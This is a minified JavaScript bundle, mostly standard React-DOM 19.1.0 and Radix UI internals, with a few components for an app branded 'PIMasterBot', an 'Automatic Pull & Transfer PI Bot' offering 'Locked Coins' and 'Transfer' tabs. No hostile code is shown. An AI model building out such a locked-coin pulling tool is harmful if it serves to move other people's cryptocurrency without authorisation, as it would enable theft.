    function Cp(z, J) {
        ki.X(z, J);
        var le = io;
        if (le && z) {
            var me = Xt(le).hoistableScripts
              , Se = oo(z)
              , Oe = me.get(Se);
            Oe || (Oe = le.querySelector(Zo(Se)),
            Oe || (z = V({
                src: z,
                async: !0
            }, J),
            (J = ni.get(Se)) && nc(z, J),
            Oe = le.createElement("script"),
            pr(Oe),
            Pn(Oe, "link", z),
            le.head.appendChild(Oe)),
            Oe = {
                type: "script",
                instance: Oe,
                count: 1,
                state: null
            },
            me.set(Se, Oe))
        }
    }
    function kp(z, J) {
        ki.M(z, J);
        var le = io;
        if (le && z) {
            var me = Xt(le).hoistableScripts
              , Se = oo(z)
              , Oe = me.get(Se);
            Oe || (Oe = le.querySelector(Zo(Se)),
            Oe || (z = V({
                src: z,
                async: !0,
                type: "module"
            }, J),
            (J = ni.get(Se)) && nc(z, J),
            Oe = le.createElement("script"),
            pr(Oe),
            Pn(Oe, "link", z),
            le.head.appendChild(Oe)),
            Oe = {
                type: "script",
                instance: Oe,
                count: 1,
                state: null
            },
            me.set(Se, Oe))
        }
    }
    function nh(z, J, le, me) {
        var Se = (Se = Ie.current) ? tu(Se) : null;
        if (!Se)
            throw Error(O(446));
        switch (z) {
        case "meta":
        case "title":
            return null;
        case "style":
            return typeof le.precedence == "string" && typeof le.href == "string" ? (J = ao(le.href),
            le = Xt(Se).hoistableStyles,
            me = le.get(J),
            me || (me = {
                type: "style",
                instance: null,
                count: 0,
                state: null
            },
            le.set(J, me)),
            me) : {
                type: "void",
                instance: null,
                count: 0,
                state: null
            };
        case "link":
            if (le.rel === "stylesheet" && typeof le.href == "string" && typeof le.precedence == "string") {
                z = ao(le.href);
                var Oe = Xt(Se).hoistableStyles
                  , pt = Oe.get(z);
                if (pt || (Se = Se.ownerDocument || Se,
                pt = {
                    type: "stylesheet",
                    instance: null,
                    count: 0,
                    state: {
                        loading: 0,
                        preload: null
                    }
                },
                Oe.set(z, pt),
                (Oe = Se.querySelector(Yo(z))) && !Oe._p && (pt.instance = Oe,
                pt.state.loading = 5),
                ni.has(z) || (le = {
                    rel: "preload",
                    as: "style",
                    href: le.href,
                    crossOrigin: le.crossOrigin,
                    integrity: le.integrity,
                    media: le.media,
                    hrefLang: le.hrefLang,
                    referrerPolicy: le.referrerPolicy
                },
                ni.set(z, le),
                Oe || Op(Se, z, le, pt.state))),
                J && me === null)
                    throw Error(O(528, ""));
                return pt
            }
            if (J && me !== null)
                throw Error(O(529, ""));
            return null;
        case "script":
            return J = le.async,
            le = le.src,
            typeof le == "string" && J && typeof J != "function" && typeof J != "symbol" ? (J = oo(le),
            le = Xt(Se).hoistableScripts,
            me = le.get(J),
            me || (me = {
                type: "script",
                instance: null,
                count: 0,
                state: null
            },
            le.set(J, me)),
            me) : {
                type: "void",
                instance: null,
                count: 0,
                state: null
            };
        default:
            throw Error(O(444, z))
        }
    }
    function ao(z) {
        return 'href="' + Cr(z) + '"'
    }
    function Yo(z) {
        return 'link[rel="stylesheet"][' + z + "]"
    }
    function ih(z) {
        return V({}, z, {
            "data-precedence": z.precedence,
            precedence: null
        })
    }
    function Op(z, J, le, me) {
        z.querySelector('link[rel="preload"][as="style"][' + J + "]") ? me.loading = 1 : (J = z.createElement("link"),
        me.preload = J,
        J.addEventListener("load", function() {
            return me.loading |= 1
        }),
        J.addEventListener("error", function() {
            return me.loading |= 2
        }),
        Pn(J, "link", le),
        pr(J),
        z.head.appendChild(J))
    }
    function oo(z) {
        return '[src="' + Cr(z) + '"]'
    }
    function Zo(z) {
        return "script[async]" + z
    }
    function ah(z, J, le) {
        if (J.count++,
        J.instance === null)
            switch (J.type) {
            case "style":
                var me = z.querySelector('style[data-href~="' + Cr(le.href) + '"]');
                if (me)
                    return J.instance = me,
                    pr(me),
                    me;
                var Se = V({}, le, {
                    "data-href": le.href,
                    "data-precedence": le.precedence,
                    href: null,
                    precedence: null
                });
                return me = (z.ownerDocument || z).createElement("style"),
                pr(me),
                Pn(me, "style", Se),
                ru(me, le.precedence, z),
                J.instance = me;
            case "stylesheet":
                Se = ao(le.href);
                var Oe = z.querySelector(Yo(Se));
                if (Oe)
                    return J.state.loading |= 4,
                    J.instance = Oe,
                    pr(Oe),
                    Oe;
                me = ih(le),
                (Se = ni.get(Se)) && rc(me, Se),
                Oe = (z.ownerDocument || z).createElement("link"),
                pr(Oe);
                var pt = Oe;
                return pt._p = new Promise(function(bt, Mt) {
                    pt.onload = bt,
                    pt.onerror = Mt
                }
                ),
                Pn(Oe, "link", me),
                J.state.loading |= 4,
                ru(Oe, le.precedence, z),
                J.instance = Oe;
            case "script":
                return Oe = oo(le.src),
                (Se = z.querySelector(Zo(Oe))) ? (J.instance = Se,
                pr(Se),
                Se) : (me = le,
                (Se = ni.get(Oe)) && (me = V({}, le),
                nc(me, Se)),
                z = z.ownerDocument || z,
                Se = z.createElement("script"),
                pr(Se),
                Pn(Se, "link", me),
                z.head.appendChild(Se),
                J.instance = Se);
            case "void":
                return null;
            default:
                throw Error(O(443, J.type))
            }
        else
            J.type === "stylesheet" && (J.state.loading & 4) === 0 && (me = J.instance,
            J.state.loading |= 4,
            ru(me, le.precedence, z));
        return J.instance
    }
    function ru(z, J, le) {
        for (var me = le.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'), Se = me.length ? me[me.length - 1] : null, Oe = Se, pt = 0; pt < me.length; pt++) {
            var bt = me[pt];
            if (bt.dataset.precedence === J)
                Oe = bt;
            else if (Oe !== Se)
                break
        }
        Oe ? Oe.parentNode.insertBefore(z, Oe.nextSibling) : (J = le.nodeType === 9 ? le.head : le,
        J.insertBefore(z, J.firstChild))
    }
    function rc(z, J) {
        z.crossOrigin == null && (z.crossOrigin = J.crossOrigin),
        z.referrerPolicy == null && (z.referrerPolicy = J.referrerPolicy),
        z.title == null && (z.title = J.title)
    }
    function nc(z, J) {
        z.crossOrigin == null && (z.crossOrigin = J.crossOrigin),
        z.referrerPolicy == null && (z.referrerPolicy = J.referrerPolicy),
        z.integrity == null && (z.integrity = J.integrity)
    }
    var nu = null;
    function oh(z, J, le) {
        if (nu === null) {
            var me = new Map
              , Se = nu = new Map;
            Se.set(le, me)
        } else
            Se = nu,
            me = Se.get(le),
            me || (me = new Map,
            Se.set(le, me));
        if (me.has(z))
            return me;
        for (me.set(z, null),
        le = le.getElementsByTagName(z),
        Se = 0; Se < le.length; Se++) {
            var Oe = le[Se];
            if (!(Oe[wt] || Oe[ht] || z === "link" && Oe.getAttribute("rel") === "stylesheet") && Oe.namespaceURI !== "http://www.w3.org/2000/svg") {
                var pt = Oe.getAttribute(J) || "";
                pt = z + pt;
                var bt = me.get(pt);
                bt ? bt.push(Oe) : me.set(pt, [Oe])
            }
        }
        return me
    }
    function sh(z, J, le) {
        z = z.ownerDocument || z,
        z.head.insertBefore(le, J === "title" ? z.querySelector("head > title") : null)
    }
    function Pp(z, J, le) {
        if (le === 1 || J.itemProp != null)
            return !1;
        switch (z) {
        case "meta":
        case "title":
            return !0;
        case "style":
            if (typeof J.precedence != "string" || typeof J.href != "string" || J.href === "")
                break;
            return !0;
        case "link":
            if (typeof J.rel != "string" || typeof J.href != "string" || J.href === "" || J.onLoad || J.onError)
                break;
            switch (J.rel) {
            case "stylesheet":
                return z = J.disabled,
                typeof J.precedence == "string" && z == null;
            default:
                return !0
            }
        case "script":
            if (J.async && typeof J.async != "function" && typeof J.async != "symbol" && !J.onLoad && !J.onError && J.src && typeof J.src == "string")
                return !0
        }
        return !1
    }
    function uh(z) {
        return !(z.type === "stylesheet" && (z.state.loading & 3) === 0)
    }
    var Qo = null;
    function Bp() {}
    function Ip(z, J, le) {
        if (Qo === null)
            throw Error(O(475));
        var me = Qo;
        if (J.type === "stylesheet" && (typeof le.media != "string" || matchMedia(le.media).matches !== !1) && (J.state.loading & 4) === 0) {
            if (J.instance === null) {
                var Se = ao(le.href)
                  , Oe = z.querySelector(Yo(Se));
                if (Oe) {
                    z = Oe._p,
                    z !== null && typeof z == "object" && typeof z.then == "function" && (me.count++,
                    me = iu.bind(me),
                    z.then(me, me)),
                    J.state.loading |= 4,
                    J.instance = Oe,
                    pr(Oe);
                    return
                }
                Oe = z.ownerDocument || z,
                le = ih(le),
                (Se = ni.get(Se)) && rc(le, Se),
                Oe = Oe.createElement("link"),
                pr(Oe);
                var pt = Oe;
                pt._p = new Promise(function(bt, Mt) {
                    pt.onload = bt,
                    pt.onerror = Mt
                }
                ),
                Pn(Oe, "link", le),
                J.instance = Oe
            }
            me.stylesheets === null && (me.stylesheets = new Map),
            me.stylesheets.set(J, z),
            (z = J.state.preload) && (J.state.loading & 3) === 0 && (me.count++,
            J = iu.bind(me),
            z.addEventListener("load", J),
            z.addEventListener("error", J))
        }
    }
    function $p() {
        if (Qo === null)
            throw Error(O(475));
        var z = Qo;
        return z.stylesheets && z.count === 0 && ic(z, z.stylesheets),
        0 < z.count ? function(J) {
            var le = setTimeout(function() {
                if (z.stylesheets && ic(z, z.stylesheets),
                z.unsuspend) {
                    var me = z.unsuspend;
                    z.unsuspend = null,
                    me()
                }
            }, 6e4);
            return z.unsuspend = J,
            function() {
                z.unsuspend = null,
                clearTimeout(le)
            }
        }
        : null
    }
    function iu() {
        if (this.count--,
        this.count === 0) {
            if (this.stylesheets)
                ic(this, this.stylesheets);
            else if (this.unsuspend) {
                var z = this.unsuspend;
                this.unsuspend = null,
                z()
            }
        }
    }
    var au = null;
    function ic(z, J) {
        z.stylesheets = null,
        z.unsuspend !== null && (z.count++,
        au = new Map,
        J.forEach(Np, z),
        au = null,
        iu.call(z))
    }
    function Np(z, J) {
        if (!(J.state.loading & 4)) {
            var le = au.get(z);
            if (le)
                var me = le.get(null);
            else {
                le = new Map,
                au.set(z, le);
                for (var Se = z.querySelectorAll("link[data-precedence],style[data-precedence]"), Oe = 0; Oe < Se.length; Oe++) {
                    var pt = Se[Oe];
                    (pt.nodeName === "LINK" || pt.getAttribute("media") !== "not all") && (le.set(pt.dataset.precedence, pt),
                    me = pt)
                }
                me && le.set(null, me)
            }
            Se = J.instance,
            pt = Se.getAttribute("data-precedence"),
            Oe = le.get(pt) || me,
            Oe === me && le.set(null, Se),
            le.set(pt, Se),
            this.count++,
            me = iu.bind(this),
            Se.addEventListener("load", me),
            Se.addEventListener("error", me),
            Oe ? Oe.parentNode.insertBefore(Se, Oe.nextSibling) : (z = z.nodeType === 9 ? z.head : z,
            z.insertBefore(Se, z.firstChild)),
            J.state.loading |= 4
        }
    }
    var Jo = {
        $$typeof: he,
        Provider: null,
        Consumer: null,
        _currentValue: de,
        _currentValue2: de,
        _threadCount: 0
    };
    function Dp(z, J, le, me, Se, Oe, pt, bt) {
        this.tag = 1,
        this.containerInfo = z,
        this.pingCache = this.current = this.pendingChildren = null,
        this.timeoutHandle = -1,
        this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null,
        this.callbackPriority = 0,
        this.expirationTimes = Vt(-1),
        this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
        this.entanglements = Vt(0),
        this.hiddenUpdates = Vt(null),
        this.identifierPrefix = me,
        this.onUncaughtError = Se,
        this.onCaughtError = Oe,
        this.onRecoverableError = pt,
        this.pooledCache = null,
        this.pooledCacheLanes = 0,
        this.formState = bt,
        this.incompleteTransitions = new Map
    }
    function lh(z, J, le, me, Se, Oe, pt, bt, Mt, Ut, Jt, rr) {
        return z = new Dp(z,J,le,pt,bt,Mt,Ut,rr),
        J = 1,
        Oe === !0 && (J |= 24),
        Oe = Vn(3, null, null, J),
        z.current = Oe,
        Oe.stateNode = z,
        J = Du(),
        J.refCount++,
        z.pooledCache = J,
        J.refCount++,
        Oe.memoizedState = {
            element: me,
            isDehydrated: le,
            cache: J
        },
        Fu(Oe),
        z
    }
    function ch(z) {
        return z ? (z = Na,
        z) : Na
    }
    function fh(z, J, le, me, Se, Oe) {
        Se = ch(Se),
        me.context === null ? me.context = Se : me.pendingContext = Se,
        me = Li(J),
        me.payload = {
            element: le
        },
        Oe = Oe === void 0 ? null : Oe,
        Oe !== null && (me.callback = Oe),
        le = ji(z, me, J),
        le !== null && (Yn(le, z, J),
        To(le, z, J))
    }
    function hh(z, J) {
        if (z = z.memoizedState,
        z !== null && z.dehydrated !== null) {
            var le = z.retryLane;
            z.retryLane = le !== 0 && le < J ? le : J
        }
    }
    function ac(z, J) {
        hh(z, J),
        (z = z.alternate) && hh(z, J)
    }
    function ph(z) {
        if (z.tag === 13) {
            var J = $a(z, 67108864);
            J !== null && Yn(J, z, 67108864),
            ac(z, 67108864)
        }
    }
    var ou = !0;
    function Lp(z, J, le, me) {
        var Se = te.T;
        te.T = null;
        var Oe = se.p;
        try {
            se.p = 2,
            oc(z, J, le, me)
        } finally {
            se.p = Oe,
            te.T = Se
        }
    }
    function jp(z, J, le, me) {
        var Se = te.T;
        te.T = null;
        var Oe = se.p;
        try {
            se.p = 8,
            oc(z, J, le, me)
        } finally {
            se.p = Oe,
            te.T = Se
        }
    }
    function oc(z, J, le, me) {
        if (ou) {
            var Se = sc(me);
            if (Se === null)
                Kl(z, J, me, su, le),
                vh(z, me);
            else if (Fp(Se, z, J, le, me))
                me.stopPropagation();
            else if (vh(z, me),
            J & 4 && -1 < Up.indexOf(z)) {
                for (; Se !== null; ) {
                    var Oe = Tt(Se);
                    if (Oe !== null)
                        switch (Oe.tag) {
                        case 3:
                            if (Oe = Oe.stateNode,
                            Oe.current.memoizedState.isDehydrated) {
                                var pt = Et(Oe.pendingLanes);
                                if (pt !== 0) {
                                    var bt = Oe;
                                    for (bt.pendingLanes |= 2,
                                    bt.entangledLanes |= 2; pt; ) {
                                        var Mt = 1 << 31 - He(pt);
                                        bt.entanglements[1] |= Mt,
                                        pt &= ~Mt
                                    }
                                    mi(Oe),
                                    (nn & 6) === 0 && (Hs = Ke() + 500,
                                    Ko(0))
                                }
                            }
                            break;
                        case 13:
                            bt = $a(Oe, 2),
                            bt !== null && Yn(bt, Oe, 2),
                            Ks(),
                            ac(Oe, 2)
                        }
                    if (Oe = sc(me),
                    Oe === null && Kl(z, J, me, su, le),
                    Oe === Se)
                        break;
                    Se = Oe
                }
                Se !== null && me.stopPropagation()
            } else
                Kl(z, J, me, null, le)
        }
    }
    function sc(z) {
        return z = hr(z),
        uc(z)
    }
    var su = null;
    function uc(z) {
        if (su = null,
        z = St(z),
        z !== null) {
            var J = w(z);
            if (J === null)
                z = null;
            else {
                var le = J.tag;
                if (le === 13) {
                    if (z = b(J),
                    z !== null)
                        return z;
                    z = null
                } else if (le === 3) {
                    if (J.stateNode.current.memoizedState.isDehydrated)
                        return J.tag === 3 ? J.stateNode.containerInfo : null;
                    z = null
                } else
                    J !== z && (z = null)
            }
        }
        return su = z,
        null
    }
    function mh(z) {
        switch (z) {
        case "beforetoggle":
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "toggle":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 2;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 8;
        case "message":
            switch (Qe()) {
            case We:
                return 2;
            case mt:
                return 8;
            case ct:
            case vt:
                return 32;
            case we:
                return 268435456;
            default:
                return 32
            }
        default:
            return 32
        }
    }
    var lc = !1
      , Ji = null
      , ea = null
      , ta = null
      , es = new Map
      , ts = new Map
      , ra = []
      , Up = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
    function vh(z, J) {
        switch (z) {
        case "focusin":
        case "focusout":
            Ji = null;
            break;
        case "dragenter":
        case "dragleave":
            ea = null;
            break;
        case "mouseover":
        case "mouseout":
            ta = null;
            break;
        case "pointerover":
        case "pointerout":
            es.delete(J.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            ts.delete(J.pointerId)
        }
    }
    function rs(z, J, le, me, Se, Oe) {
        return z === null || z.nativeEvent !== Oe ? (z = {
            blockedOn: J,
            domEventName: le,
            eventSystemFlags: me,
            nativeEvent: Oe,
            targetContainers: [Se]
        },
        J !== null && (J = Tt(J),
        J !== null && ph(J)),
        z) : (z.eventSystemFlags |= me,
        J = z.targetContainers,
        Se !== null && J.indexOf(Se) === -1 && J.push(Se),
        z)
    }
    function Fp(z, J, le, me, Se) {
        switch (J) {
        case "focusin":
            return Ji = rs(Ji, z, J, le, me, Se),
            !0;
        case "dragenter":
            return ea = rs(ea, z, J, le, me, Se),
            !0;
        case "mouseover":
            return ta = rs(ta, z, J, le, me, Se),
            !0;
        case "pointerover":
            var Oe = Se.pointerId;
            return es.set(Oe, rs(es.get(Oe) || null, z, J, le, me, Se)),
            !0;
        case "gotpointercapture":
            return Oe = Se.pointerId,
            ts.set(Oe, rs(ts.get(Oe) || null, z, J, le, me, Se)),
            !0
        }
        return !1
    }
    function yh(z) {
        var J = St(z.target);
        if (J !== null) {
            var le = w(J);
            if (le !== null) {
                if (J = le.tag,
                J === 13) {
                    if (J = b(le),
                    J !== null) {
                        z.blockedOn = J,
                        ze(z.priority, function() {
                            if (le.tag === 13) {
                                var me = Wn();
                                me = Ft(me);
                                var Se = $a(le, me);
                                Se !== null && Yn(Se, le, me),
                                ac(le, me)
                            }
                        });
                        return
                    }
                } else if (J === 3 && le.stateNode.current.memoizedState.isDehydrated) {
                    z.blockedOn = le.tag === 3 ? le.stateNode.containerInfo : null;
                    return
                }
            }
        }
        z.blockedOn = null
    }
    function uu(z) {
        if (z.blockedOn !== null)
            return !1;
        for (var J = z.targetContainers; 0 < J.length; ) {
            var le = sc(z.nativeEvent);
            if (le === null) {
                le = z.nativeEvent;
                var me = new le.constructor(le.type,le);
                ia = me,
                le.target.dispatchEvent(me),
                ia = null
            } else
                return J = Tt(le),
                J !== null && ph(J),
                z.blockedOn = le,
                !1;
            J.shift()
        }
        return !0
    }
    function gh(z, J, le) {
        uu(z) && le.delete(J)
    }
    function zp() {
        lc = !1,
        Ji !== null && uu(Ji) && (Ji = null),
        ea !== null && uu(ea) && (ea = null),
        ta !== null && uu(ta) && (ta = null),
        es.forEach(gh),
        ts.forEach(gh)
    }
    function lu(z, J) {
        z.blockedOn === J && (z.blockedOn = null,
        lc || (lc = !0,
        _.unstable_scheduleCallback(_.unstable_NormalPriority, zp)))
    }
    var cu = null;
    function bh(z) {
        cu !== z && (cu = z,
        _.unstable_scheduleCallback(_.unstable_NormalPriority, function() {
            cu === z && (cu = null);
            for (var J = 0; J < z.length; J += 3) {
                var le = z[J]
                  , me = z[J + 1]
                  , Se = z[J + 2];
                if (typeof me != "function") {
                    if (uc(me || le) === null)
                        continue;
                    break
                }
                var Oe = Tt(le);
                Oe !== null && (z.splice(J, 3),
                J -= 3,
                sl(Oe, {
                    pending: !0,
                    data: Se,
                    method: le.method,
                    action: me
                }, me, Se))
            }
        }))
    }
    function ns(z) {
        function J(Mt) {
            return lu(Mt, z)
        }
        Ji !== null && lu(Ji, z),
        ea !== null && lu(ea, z),
        ta !== null && lu(ta, z),
        es.forEach(J),
        ts.forEach(J);
        for (var le = 0; le < ra.length; le++) {
            var me = ra[le];
            me.blockedOn === z && (me.blockedOn = null)
        }
        for (; 0 < ra.length && (le = ra[0],
        le.blockedOn === null); )
            yh(le),
            le.blockedOn === null && ra.shift();
        if (le = (z.ownerDocument || z).$$reactFormReplay,
        le != null)
            for (me = 0; me < le.length; me += 3) {
                var Se = le[me]
                  , Oe = le[me + 1]
                  , pt = Se[_t] || null;
                if (typeof Oe == "function")
                    pt || bh(le);
                else if (pt) {
                    var bt = null;
                    if (Oe && Oe.hasAttribute("formAction")) {
                        if (Se = Oe,
                        pt = Oe[_t] || null)
                            bt = pt.formAction;
                        else if (uc(Se) !== null)
                            continue
                    } else
                        bt = pt.action;
                    typeof bt == "function" ? le[me + 1] = bt : (le.splice(me, 3),
                    me -= 3),
                    bh(le)
                }
            }
    }
    function cc(z) {
        this._internalRoot = z
    }
    fu.prototype.render = cc.prototype.render = function(z) {
        var J = this._internalRoot;
        if (J === null)
            throw Error(O(409));
        var le = J.current
          , me = Wn();
        fh(le, me, z, J, null, null)
    }
    ,
    fu.prototype.unmount = cc.prototype.unmount = function() {
        var z = this._internalRoot;
        if (z !== null) {
            this._internalRoot = null;
            var J = z.containerInfo;
            fh(z.current, 2, null, z, null, null),
            Ks(),
            J[Ge] = null
        }
    }
    ;
    function fu(z) {
        this._internalRoot = z
    }
    fu.prototype.unstable_scheduleHydration = function(z) {
        if (z) {
            var J = at();
            z = {
                blockedOn: null,
                target: z,
                priority: J
            };
            for (var le = 0; le < ra.length && J !== 0 && J < ra[le].priority; le++)
                ;
            ra.splice(le, 0, z),
            le === 0 && yh(z)
        }
    }
    ;
    var _h = M.version;
    if (_h !== "19.1.0")
        throw Error(O(527, _h, "19.1.0"));
    se.findDOMNode = function(z) {
        var J = z._reactInternals;
        if (J === void 0)
            throw typeof z.render == "function" ? Error(O(188)) : (z = Object.keys(z).join(","),
            Error(O(268, z)));
        return z = Y(J),
        z = z !== null ? F(z) : null,
        z = z === null ? null : z.stateNode,
        z
    }
    ;
    var Hp = {
        bundleType: 0,
        version: "19.1.0",
        rendererPackageName: "react-dom",
        currentDispatcherRef: te,
        reconcilerVersion: "19.1.0"
    };
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
        var du = __REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!du.isDisabled && du.supportsFiber)
            try {
                st = du.inject(Hp),
                et = du
            } catch {}
    }
    return reactDomClient_production.createRoot = function(z, J) {
        if (!x(z))
            throw Error(O(299));
        var le = !1
          , me = ""
          , Se = If
          , Oe = $f
          , pt = Nf
          , bt = null;
        return J != null && (J.unstable_strictMode === !0 && (le = !0),
        J.identifierPrefix !== void 0 && (me = J.identifierPrefix),
        J.onUncaughtError !== void 0 && (Se = J.onUncaughtError),
        J.onCaughtError !== void 0 && (Oe = J.onCaughtError),
        J.onRecoverableError !== void 0 && (pt = J.onRecoverableError),
        J.unstable_transitionCallbacks !== void 0 && (bt = J.unstable_transitionCallbacks)),
        J = lh(z, 1, !1, null, null, le, me, Se, Oe, pt, bt, null),
        z[Ge] = J.current,
        Vl(z),
        new cc(J)
    }
    ,
    reactDomClient_production.hydrateRoot = function(z, J, le) {
        if (!x(z))
            throw Error(O(299));
        var me = !1
          , Se = ""
          , Oe = If
          , pt = $f
          , bt = Nf
          , Mt = null
          , Ut = null;
        return le != null && (le.unstable_strictMode === !0 && (me = !0),
        le.identifierPrefix !== void 0 && (Se = le.identifierPrefix),
        le.onUncaughtError !== void 0 && (Oe = le.onUncaughtError),
        le.onCaughtError !== void 0 && (pt = le.onCaughtError),
        le.onRecoverableError !== void 0 && (bt = le.onRecoverableError),
        le.unstable_transitionCallbacks !== void 0 && (Mt = le.unstable_transitionCallbacks),
        le.formState !== void 0 && (Ut = le.formState)),
        J = lh(z, 1, !0, J, le ?? null, me, Se, Oe, pt, bt, Mt, Ut),
        J.context = ch(null),
        le = J.current,
        me = Wn(),
        me = Ft(me),
        Se = Li(me),
        Se.callback = null,
        ji(le, Se, me),
        le = me,
        J.current.lanes = le,
        Pt(J, le),
        mi(J),
        z[Ge] = J.current,
        Vl(z),
        new fu(J)
    }
    ,
    reactDomClient_production.version = "19.1.0",
    reactDomClient_production
}
var hasRequiredClient;
function requireClient() {
    if (hasRequiredClient)
        return client.exports;
    hasRequiredClient = 1;
    function _() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(_)
            } catch (M) {
                console.error(M)
            }
    }
    return _(),
    client.exports = requireReactDomClient_production(),
    client.exports
}
var clientExports = requireClient();
const BotHeader = () => jsxRuntimeExports.jsxs("div", {
    className: "flex flex-col justify-center items-center gap-2",
    children: [jsxRuntimeExports.jsx("h1", {
        className: "capitalize text-3xl md:text-4xl font-bold text-emerald-600",
        children: "PIMasterBot"
    }), jsxRuntimeExports.jsx("h2", {
        className: "text-base font-medium text-slate-400",
        children: "Automatic Pull & Transfer PI Bot"
    })]
})
  , Tab = ({onSetTab: _}) => {
    const [M,j] = reactExports.useState(1);
    reactExports.useEffect( () => {
        _(O[M])
    }
    );
    const O = ["Locked Coins", "Transfer"]
      , x = w => {
        j(w),
        _(O[w])
    }
    ;
    return jsxRuntimeExports.jsx("div", {
        className: "flex bg-slate-700 md:w-96 w-full py-1.5 rounded-md gap-3 px-1 p-4",
        children: O.map( (w, b) => jsxRuntimeExports.jsx("button", {
            type: "button",
            className: `${b == M ? "bg-slate-950 rounded shadow font-medium" : "font-semibold"} w-1/2 text-base py-1 text-gray-400 cursor-pointer`,
            onClick: () => x(b),
            children: w
        }, b))
    })
}
;
var reactDomExports = requireReactDom();
const ReactDOM = getDefaultExportFromCjs$1(reactDomExports);
function setRef(_, M) {
    if (typeof _ == "function")
        return _(M);
    _ != null && (_.current = M)
}
function composeRefs(..._) {
    return M => {
        let j = !1;
        const O = _.map(x => {
            const w = setRef(x, M);
            return !j && typeof w == "function" && (j = !0),
            w
        }
        );
        if (j)
            return () => {
                for (let x = 0; x < O.length; x++) {
                    const w = O[x];
                    typeof w == "function" ? w() : setRef(_[x], null)
                }
            }
    }
}
function useComposedRefs(..._) {
    return reactExports.useCallback(composeRefs(..._), _)
}
function createSlot(_) {
    const M = createSlotClone(_)
      , j = reactExports.forwardRef( (O, x) => {
        const {children: w, ...b} = O
          , X = reactExports.Children.toArray(w)
          , Y = X.find(isSlottable);
        if (Y) {
            const F = Y.props.children
              , V = X.map(K => K === Y ? reactExports.Children.count(F) > 1 ? reactExports.Children.only(null) : reactExports.isValidElement(F) ? F.props.children : null : K);
            return jsxRuntimeExports.jsx(M, {
                ...b,
                ref: x,
                children: reactExports.isValidElement(F) ? reactExports.cloneElement(F, void 0, V) : null
            })
        }
        return jsxRuntimeExports.jsx(M, {
            ...b,
            ref: x,
            children: w
        })
    }
    );
    return j.displayName = `${_}.Slot`,
    j
}
var Slot$3 = createSlot("Slot");
function createSlotClone(_) {
    const M = reactExports.forwardRef( (j, O) => {
        const {children: x, ...w} = j;
        if (reactExports.isValidElement(x)) {
            const b = getElementRef$1(x)
              , X = mergeProps(w, x.props);
            return x.type !== reactExports.Fragment && (X.ref = O ? composeRefs(O, b) : b),
            reactExports.cloneElement(x, X)
        }
        return reactExports.Children.count(x) > 1 ? reactExports.Children.only(null) : null
    }
    );
    return M.displayName = `${_}.SlotClone`,
    M
}
var SLOTTABLE_IDENTIFIER = Symbol("radix.slottable");
function createSlottable(_) {
    const M = ({children: j}) => jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
        children: j
    });
    return M.displayName = `${_}.Slottable`,
    M.__radixId = SLOTTABLE_IDENTIFIER,
    M
}
var Slottable$1 = createSlottable("Slottable");
function isSlottable(_) {
    return reactExports.isValidElement(_) && typeof _.type == "function" && "__radixId"in _.type && _.type.__radixId === SLOTTABLE_IDENTIFIER
}
function mergeProps(_, M) {
    const j = {
        ...M
    };
    for (const O in M) {
        const x = _[O]
          , w = M[O];
        /^on[A-Z]/.test(O) ? x && w ? j[O] = (...X) => {
            const Y = w(...X);
            return x(...X),
            Y
        }
        : x && (j[O] = x) : O === "style" ? j[O] = {
            ...x,
            ...w
        } : O === "className" && (j[O] = [x, w].filter(Boolean).join(" "))
    }
    return {
        ..._,
        ...j
    }
}
function getElementRef$1(_) {
    var O, x;
    let M = (O = Object.getOwnPropertyDescriptor(_.props, "ref")) == null ? void 0 : O.get
      , j = M && "isReactWarning"in M && M.isReactWarning;
    return j ? _.ref : (M = (x = Object.getOwnPropertyDescriptor(_, "ref")) == null ? void 0 : x.get,
    j = M && "isReactWarning"in M && M.isReactWarning,
    j ? _.props.ref : _.props.ref || _.ref)
}
var NODES = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "select", "span", "svg", "ul"]
  , Primitive$1 = NODES.reduce( (_, M) => {
    const j = createSlot(`Primitive.${M}`)
      , O = reactExports.forwardRef( (x, w) => {
        const {asChild: b, ...X} = x
          , Y = b ? j : M;
        return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0),
        jsxRuntimeExports.jsx(Y, {
            ...X,
            ref: w
        })
    }
    );
    return O.displayName = `Primitive.${M}`,
    {
        ..._,
        [M]: O
    }
}
, {});
function dispatchDiscreteCustomEvent(_, M) {
    _ && reactDomExports.flushSync( () => _.dispatchEvent(M))
}
var VISUALLY_HIDDEN_STYLES = Object.freeze({
    position: "absolute",
